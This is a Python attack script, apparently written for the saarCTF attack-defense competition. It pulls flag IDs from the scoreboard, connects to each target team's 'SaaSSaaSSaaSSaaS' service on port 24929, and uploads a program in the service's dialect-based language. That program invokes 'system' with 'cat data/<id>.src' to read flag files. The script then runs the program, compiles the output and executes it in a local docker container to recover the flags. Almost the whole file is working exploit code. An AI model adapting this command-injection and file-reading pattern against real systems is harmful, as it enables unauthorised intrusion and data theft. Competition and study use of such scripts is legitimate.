#! /usr/bin/python
from pwn import remote, context
import requests
import json
import sys
import random, string
import os
import subprocess as sp

randstr = lambda N: "".join(random.choices(string.ascii_uppercase, k=N))


def get_flag_ids():
    r = requests.get("https://scoreboard.ctf.saarland/attack.json")
    if r.status_code != 200:
        print(r.text)
        raise RuntimeError("Failed to fetch flag IDs")
    return json.loads(r.text)


fid = get_flag_ids()

ids = fid["flag_ids"]["SaaSSaaSSaaSSaaS"]


ip = sys.argv[1]


# docker pull ubuntu
# docker run -it -d ubuntu
# docker cp . interesting_almeida:/home

docker_name = "interesting_almeida"

if ip not in ids:
    exit()


txt = f"""
"B2@"
Vergliggere 's Petra holle 's Christa unn dann holle 's Christa unn dann holle 's Christa unn dann holle 's Christa unn dann holle 's Christa unn dann mach allemohl
    Tappe Hemm Unn Holle "system"
Aweil is awwer Schluss!
holle "cat data/REPLACE" unn dann holle 1 unn dann holle 3 unn dann holle 52423 unn dann geh uff Trulla bei 's Petra.""".strip()


for _, v in ids[ip].items():
    r = remote(ip, "24929", ssl=True)
    context.log_level = "error"
    r.recvuntil(b"choice: ")
    r.sendline(b"2")
    r.recvuntil(b"program: ")
    prog_name = randstr(20)
    r.sendline(prog_name.encode())

    r.recvuntil(b"blank line")

    for line in txt.replace("REPLACE", v + ".src").split("\n"):
        r.sendline(line.encode())
    r.sendline(b"")

    r.close()
    r = remote(ip, "24929", ssl=True)
    context.log_level = "error"
    r.recvuntil(b"choice: ")
    r.sendline(b"1")
    r.recvuntil(b"run: ")
    r.sendline(prog_name.encode())

    r.recvline()
    r.recvline()
    resp = r.recvall().strip()

    last_line = resp.strip().split(b"\n")[-1]
    path = f"/tmp/{randstr(8)}"

    with open(path, "wb") as of:
        if b"Brundse" in last_line:
            of.write(resp)
        else:
            lines = resp.split(b"\n")
            if b"password" in lines[-4]:
                del lines[-3]
                del lines[-1]
            of.write(b"\n".join(lines))

    import os

    os.system(f"./saascc {path}")
    os.system(f"docker cp {path}.bin {docker_name}:{path}.bin")
    os.system(f"docker exec -it {docker_name} /home/saarvm {path}.bin")
    # os.system(f"./saarvm {path}.bin")
    os.unlink(path)
    os.unlink(path + ".bin")
    # print(flush=True)
    r.close()
